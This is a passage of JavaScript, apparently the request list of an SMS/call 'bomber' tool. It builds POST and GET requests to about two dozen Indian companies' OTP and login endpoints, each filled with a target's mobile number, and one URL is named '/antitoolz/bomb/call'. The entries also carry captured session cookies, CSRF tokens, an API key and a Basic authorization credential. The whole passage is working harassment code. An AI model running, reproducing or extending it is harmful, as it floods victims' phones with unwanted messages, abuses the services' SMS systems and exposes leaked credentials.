        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Content-Length: 41",
        "Cookie: AWSALB=B7foySmYZxY9mDL7N7VOGpEfe5NlJyYr8GFV+6PSj/S6S2HzVSrUizel6sH902tdw9AhUOxGoVlKZ9FNCLKQy5QnYlBRt+UBkaIstpVRmRDgwk9K3SBhVIb1jRGq; AWSALBCORS=B7foySmYZxY9mDL7N7VOGpEfe5NlJyYr8GFV+6PSj/S6S2HzVSrUizel6sH902tdw9AhUOxGoVlKZ9FNCLKQy5QnYlBRt+UBkaIstpVRmRDgwk9K3SBhVIb1jRGq",
        "priority: u=1, i",
        "origin: https://mamaearth.in"
      ],
      "data": JSON.stringify({
        "mobile": mobile,
        "referralCode": ""
      })
    },
    {
      "url": "https://api.chemist180.com/api/customer/send-verification-code",
      "method": "POST",
      "headers": [
        "Host: api.chemist180.com",
        "Connection: keep-alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/json",
        "User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)",
        "Content-Length: 23",
        "Origin: https://chemist180.com",
        "Referer: https://chemist180.com/",
        "Accept: */*"
      ],
      "data": JSON.stringify({"number": mobile})
    },
    {
      "url": "https://app.medkart.in/api/v1/auth/requestOTP?uuid=f9e75a95-e172-4922-b69c-08e1e3be9f1b",
      "method": "POST",
      "headers": [
        "Host: app.medkart.in",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/json",
        "User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)",
        "Content-Length: 26",
        "referer: https://www.medkart.in/",
        "priority: u=1, i",
        "origin: https://www.medkart.in",
        "accept: application/json, text/plain, */*"
      ],
      "data": JSON.stringify({"mobile_no": mobile})
    },
    {
      "url": "https://www.metropolisindia.com/customerlogin",
      "method": "POST",
      "headers": [
        "Host: www.metropolisindia.com",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Content-Length: 68",
        "Cookie: AWSALB=nf8n5exeLtpXpie/WOqAZYEUxBmjjGdU5FbnlAydksu3DF05pA9aVZziy8EstSB6swwxejFuP8457HNwXKtRrw7Kp7akO4f8YnQZdYiIl6PVfyX5FkuNdqSapeVR; AWSALBCORS=nf8n5exeLtpXpie/WOqAZYEUxBmjjGdU5FbnlAydksu3DF05pA9aVZziy8EstSB6swwxejFuP8457HNwXKtRrw7Kp7akO4f8YnQZdYiIl6PVfyX5FkuNdqSapeVR; metropolis_session=qpoJnwgP4BCPp90VKB4QFaiBIn1sXv9ML2WkIeWU",
        "referer: https://www.metropolisindia.com/",
        "origin: https://www.metropolisindia.com",
        "x-requested-with: XMLHttpRequest",
        "x-csrf-token: JkI5jQn0n91aE9Ao8zTnHuPPybU7KetEgAQT2Hu3",
        "accept: */*"
      ],
      "data": `addbasket_id=&addbasket_type=&login_input=${mobile}&isaddbasket=no&`
    },
    {
      "url": "https://itechstore.co.in/home/send_login_otp",
      "method": "POST",
      "headers": [
        "Host: itechstore.co.in",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Content-Length: 18",
        "Cookie: ci_session=gei1ug6sfrv9fqhet62amce88vpgag97",
        "referer: https://itechstore.co.in/user/login",
        "origin: https://itechstore.co.in"
      ],
      "data": `mobile=${mobile}&`
    },
    {
      "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false",
      "method": "POST",
      "headers": [
        "Host: api.redcliffelabs.com",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/json; charset=utf-8",
        "User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)",
        "Content-Length: 42",
        "Cookie: gDeviceId=1dd5fbaf-338d-4094-b535-749f26749886"
      ],
      "data": JSON.stringify({
        "phone_number": mobile,
        "short": true
      })
    },
    {
      "url": "https://dashboardapi.hashtagloyalty.com/v3/sign_up/create_otp",
      "method": "POST",
      "headers": [
        "Host: dashboardapi.hashtagloyalty.com",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Content-Length: 18"
      ],
      "data": `mobile=${mobile}&`
    },
    {
      "url": "https://nfapi.naturefit.in/api/auth/localsignup",
      "method": "POST",
      "headers": [
        "Host: nfapi.naturefit.in",
        "Connection: keep-alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/json;charset=UTF-8",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Content-Length: 62",
        "Accept-Language: en-GB,en-US;q=0.9,en;q=0.8"
      ],
      "data": JSON.stringify({
        "mobile": mobile,
        "otp": 4521,
        "name": null,
        "password": null
      })
    },
    {
      "url": "https://www.rajkumari.co/Login/sendLoginOtp",
      "method": "POST",
      "headers": [
        "Host: www.rajkumari.co",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/x-www-form-urlencoded",
        "User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)",
        "Content-Length: 45",
        "Cookie: PHPSESSID=7f48437bf2415660b5646987b6c08f806b5fcc27"
      ],
      "data": `referral=&url=&pagename=&username=${mobile}&`
    },
    {
      "url": "https://www.urbanclap.com/api/v2/growth/profile/generateOTPv2",
      "method": "POST",
      "headers": [
        "Host: www.urbanclap.com",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/json",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Content-Length: 135",
        "Cookie: __cf_bm=DYmLmZXLDEmfiNOv6o86HgnUhBacayqiF.2VkoOFMgc-1720161468-1.0.1.1-x.dQYlrwENED0n0rVeQch91.UwzHGOA902JFqdYPF24T3cjCEP500OCMqZWa_9CmtKGYvKXkFJfOM12L44ICBg"
      ],
      "data": JSON.stringify({
        "city_key": null,
        "countryId": "IND",
        "customer": {
          "phone": {
            "isd_code": "+91",
            "phone_wo_isd": mobile
          }
        },
        "resend": false,
        "source": "phone"
      })
    },
    {
      "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp",
      "method": "POST",
      "headers": [
        "Host: api.jobhai.com",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/json",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Content-Length: 22",
        "Cookie: _abck=5EA54BD7CBF9C0F3B5F56C5C46D352C5~-1~YAAQRGw/F+M2NFGQAQAAYvzIkwxZN30HmrcwfUTeeFfhbupQ4Xo25XB8osVMGnYB9I70CjRAGAHeoGdEMi8PeihIlOYHhH2zpQXFQflAfBRp7miH6Qybduu3qqKl7/9pe5o/tkRDbxdOXMeNWvnSgdRm0HdQhs7gJE6zwoBclvwrTDsKPjg66WWFWjrFFvAitVOD2wqbsu2AiG5s0fJut8l5hwkPJOiGigMer0nO1tSBn2+jQsfEPSSEoCa9WhqkUSxgOoxCQCRFoHJVf1BLeZYWMd/wtSU0qO3IUE5L8YSrjhakZpOSyJV5Ql/Pt8ff0FJb0hO1i8lBmjpbJGGuwXSzzeIddBPgVGenlFhJrU4xA26ZB1zuDCY=~-1~-1~-1; ak_bmsc=F33D45EDC8381CD8D16DE513E22CAC48~000000000000000000000000000000~YAAQRGw/F+Q2NFGQAQAAYvzIkxg7dOsHXGci7hXTITtNfmjcngEkqlIacmeDS1U7WGc5mwjIoeSw1YGgzH1PyHJerHWkd6skKR+pGaHwS0rLEzOihP8kC8wsGcYOA/fkIJI7FSk/yEYewS5htpGdmqVweqmSeeqTSihkd8fReF4gjZ9BAyWltiqg0XO0bUWN4mfWlznSIASl2Z/RTKdMTayauhfXjc1utS4Z3Yd+E505kp3Uj6dAb9g5mp70/BEp2+NVeLC/qQsdsmpXgE84GrvONCWc55hrCseZLkS8OPTjseXYvFz9XoL2q7OTZyumR/e5jfo85Q3n9IdBNQOXo8U1F7IS/w+twcZelcu8zE3YD5IChsRUBXzbDWw=; bm_sv=18A7BB46BEDF3698B62720A95BD0AF51~YAAQRGw/F1VNNFGQAQAA7KPKkxhFiCZmR5DkWIrs5/pp88rnkJZwcY/+inulL7rj1JrLrE6wxgI7EEi46G71Rfc0shA6Xf2sTn5mZdSnMYBwmJMoHnpOtBi3XOMe6M4flBdpbwt5dix37awzrsciaGKNSCvYTcHpbQAsk7ga1aRXkl7OeYWDzN4mcFmSmteHCANZKLQOKrSltq6lrex8snAHlIjKLm3jCZh4E5EnGCjLJmi08zW42RqgN+lgdYht~1; bm_sz=5785E4E107BF9964E43CEE577A21F9E6~YAAQRGw/F+U2NFGQAQAAYvzIkxhAoLr1QbP8SxPwptqu6SRkSMxjpXIIiaIGMa5HmB8jyra6sJaHZaW4BBgHAlhNGgBIyVhUOfQa22x/fzONLynTRDewwpgmxR4a/qaXn5O8CEeWX966fv7szBUTfTqYuHek3wjjNQ2vi3Pq1Hq/AdI9mOB2ST5lWsJx5DNGw9G9KYZTH4LmhgBNnFtYrW/4nVY65CG4NSUQ9gKmzhXa4/fy3vquX718WiN4ymwybix3cInm+Izyl/4yEnFqCtjJshXBckq9zU42AFkLWWYGqBNwz4A1bWbUtHAtkTxrmMMvkH369JDFWt5YkmN0sumVirbpgVdmO3NRCz3U~3290673~4536373",
        "referer: https://www.jobhai.com/",
        "x-transaction-id: JS-WEB-cb71a96e-c335-4947-a379-bf6ee24f9a3d",
        "origin: https://www.jobhai.com",
        "language: en",
        "device-id: e97edd71-16a3-4835-8aab-c67cf5e21be1"
      ],
      "data": JSON.stringify({"phone": mobile})
    },
    {
      "url": `https://www.choosemybicycle.com/api/user-account/send-otp?mobile_number=%2B91${mobile}`,
      "method": "GET",
      "headers": [
        "Host: www.choosemybicycle.com",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
      ],
      "data": null
    },
    {
      "url": "https://citymall.live/api/cl-user/auth/get-otp",
      "method": "POST",
      "headers": [
        "Host: citymall.live",
        "Connection: keep-alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/json",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Content-Length: 29",
        "x-app-name: WEB",
        "use-applinks: true",
        "x-requested-with: WEB"
      ],
      "data": JSON.stringify({"phone_number": mobile})
    },
    {
      "url": "https://card.fplabs.tech/onecard/bff/open/v1/web/otp/generate",
      "method": "POST",
      "headers": [
        "Host: card.fplabs.tech:9000",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/json",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Content-Length: 65",
        "authorization: Basic ZnBsYWJzOjFGUExhYnMyMzIw",
        "x-api-key: 78fec47f31afbace1588051dc4a594b86fa8bced48e48c3123ba8b29b6bf30f1"
      ],
      "data": JSON.stringify({
        "mobile": mobile,
        "deviceType": "WEB",
        "whatsappConsent": true
      })
    },
    {
      "url": "https://webapi.zoopindia.com/v3/customers/login",
      "method": "POST",
      "headers": [
        "Host: webapi.zoopindia.com",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/json",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Content-Length: 46",
        "source: Desktop-Web",
        "deviceInfo: [object Object]"
      ],
      "data": JSON.stringify({
        "mobile": mobile,
        "source": "Desktop-Web"
      })
    },
    {
      "url": "https://accounts.orangehealth.in/api/v1/user/otp/generate/",
      "method": "POST",
      "headers": [
        "Host: accounts.orangehealth.in",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/json",
        "User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)",
        "Content-Length: 65"
      ],
      "data": JSON.stringify({
        "mobile_number": mobile,
        "customer_auto_fetch_message": true
      })
    },
    {
      "url": "https://www.shyaway.com/rest/default/V1/customer/sendOtp/",
      "method": "POST",
      "headers": [
        "Host: www.shyaway.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Content-Length": "56",
        "Cookie": "PHPSESSID=75cc94c0163c19616389d90ee8372b5f",
        "referer": "https://www.shyaway.com/customer/account/login/",
        "origin": "https://www.shyaway.com",
        "x-requested-with": "XMLHttpRequest",
        "priority": "u=1, i",
        "x-newrelic-id": "VgMCUFBRDRAEVlBVBQEFU1E="
      ],
      "data": JSON.stringify({
        "username": mobile,
        "type": "login",
        "source": "html"
      })
    },
    {
      "url": "https://fleshia.com/antitoolz/bomb/call",
      "method": "POST",
      "headers": [
        "Host: fleshia.com",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/json",
        "User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)",
        "Content-Length: 88"
      ],
      "data": JSON.stringify({
        "number": mobile,
        "deviceid": "4362bd8ac31ee49f",
        "token": "1rdcp2luRaxam5pCx+BlxQ=="
      })
    },
    {
      "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
      "method": "POST",
      "headers": [
        "Host: prod.api.cosmofeed.com",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/json",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Content-Length: 146",
        "cosmofeed-request-id: fe247a51-c977-4882-a9b8-fe303692ddc3"
      ],
      "data": JSON.stringify({
        "phoneNumber": mobile,
        "countryCode": "+91",
        "data": {"email": "abcd2@gmail.com"},
        "authScreen": "signup-screen",
        "userIsConvertingToCreator": false
      })
    },
    {
      "url": "https://www.adda52.org.in/api/v1/offers/user/sendOtp",
      "method": "POST",
      "headers": [
        "Host: www.adda52.org.in",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Content-Length: 74"
      ],
      "data": `user=${mobile}&clientName=web&domainKey=Adda52.org.in&source=landing_page`
    },
    {
      "url": "https://lead.redcliffelabs.com/generate-lead-by-user/",
      "method": "POST",
      "headers": [
        "Host: lead.redcliffelabs.com",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/json",
        "User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        "Content-Length: 584",
        "sec-fetch-mode: cors",
        "referer: https://redcliffelabs.com/",
        "sec-fetch-site: same-site",
        "accept-language: en-US,en;q=0.9",
        "origin: https://redcliffelabs.com",
        "priority: u=1, i",
        "accept: application/json, text/plain, */*",
        "sec-ch-ua: \"Google Chrome\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"",
        "sec-ch-ua-mobile: ?1",
        "sec-ch-ua-platform: \"Android\"",
        "sec-fetch-dest: empty"
      ],
      "data": JSON.stringify({
        "name": "rohan",
        "phone_no": mobile,
        "city": "NEW DELHI",
        "optin": true,
        "source": "google_lp",
        "url": "https://redcliffelabs.com/cms-lp/vital-screening-package-lite/top/version5?network=g&campaignid=14035817754&adgroupid=125609841575&keyword=full%20body%20checkup&matchtype=e&creative=598896390949&feeditemid=&device=m&targetid=kwd-10707792579&adposition=&source=googleads&Location=1007824&gad=1&gclid=CjwKCAjw-vmkBhBMEiwAlrMeFyCQRoembc5UCyAgUfuItWxC9N1CUJX8VmRV21kYczdEoJ5EQYF4vxoC5OoQAvD_BwE",
        "package_name": "Vital Screening Package Lite",
        "price": "399",
        "optin_data_process": true
      })
    },
    {
      "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
      "method": "POST",
      "headers": [
        "Host: businessloan.tatacapital.com",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/json",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
        "Content-Length: 130",
        "sec-fetch-mode: cors",
        "referer: https://www.tatacapital.com/",
        "sec-fetch-site: same-site",
        "accept-language: en-US,en;q=0.9",
        "origin: https://www.tatacapital.com",
        "priority: u=1, i",
        "accept: application/json, text/plain, */*",
        "sec-ch-ua: \"Google Chrome\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"",
        "sec-ch-ua-mobile: ?0",
        "sec-ch-ua-platform: \"Windows\"",
        "sec-fetch-dest: empty"
      ],
      "data": JSON.stringify({
        "mobileNumber": mobile,
        "deviceOs": "web",
        "sourceName": "MitayeFaasleWebsite",
        "isOdFlow": "no",
        "deviceInfo": "Windows Web Browser"
      })
    },
    {
      "url": "https://unacademy.com/api/v3/user/user_check/?enable-email=true",
      "method": "POST",
      "headers": [
        "Host: unacademy.com",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "Content-Type: application/json",
        "User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        "Content-Length: 107",
        "sec-fetch-mode: cors",
        "referer: https://unacademy.com/",
        "sec-fetch-site: same-origin",
        "accept-language: en-US,en;q=0.9",
        "cookie: isDarkModeOn=; ajs_anonymous_id=56804d86_d9c8_48e6_9296_26161aacf17d; AMP_MKTG_d90ac5135c=JTdCJTIycmVmZXJyZXIlMjIlM0ElMjJodHRwcyUzQSUyRiUyRnd3dy5nb29nbGUuY29tJTJGJTIyJTJDJTIycmVmZXJyaW5nX2RvbWFpbiUyMiUzQSUyMnd3dy5nb29nbGUuY29tJTIyJTdE; _fbp=fb.1.1729189620998.798062977569751020; un_session_id=abc0e224_61c9_4192_857e_bc7c6c045238; anonymous_session_id=97fe49c4_c1c1_426b_90d4_4d01996642ea; AMP_d90ac5135c=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjJmZmIxYmJmYi0zZWU5LTQxNjItOTk5YS0zMzQzNDM3ZGFmYmQlMjIlMkMlMjJ1c2VySWQlMjIlM0ElMjJOQSUyMiUyQyUyMnNlc3Npb25JZCUyMiUzQTE3MjkyNzIwNzM3NjklMkMlMjJvcHRPdXQlMjIlM0FmYWxzZSUyQyUyMmxhc3RFdmVudFRpbWUlMjIlM0ExNzI5MjcyMTY0MzE1JTJDJTIybGFzdEV2ZW50SWQlMjIlM0ExOCUyQyUyMnBhZ2VDb3VudGVyJTIyJTNBMSU3RA==",
        "origin: https://unacademy.com",
        "priority: u=1, i",
        "accept: */*",
        "sec-ch-ua: \"Google Chrome\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"",
        "sec-ch-ua-mobile: ?1",
        "sec-ch-ua-platform: \"Android\"",
        "x-platform: 7",
        "sec-fetch-dest: empty"
      ],
      "data": JSON.stringify({
        "phone": mobile,
        "country_code": "IN",
        "otp_type": 2,
        "email": "",
        "send_otp": true,
        "is_un_teach_user": false
      })
    }
  ];
}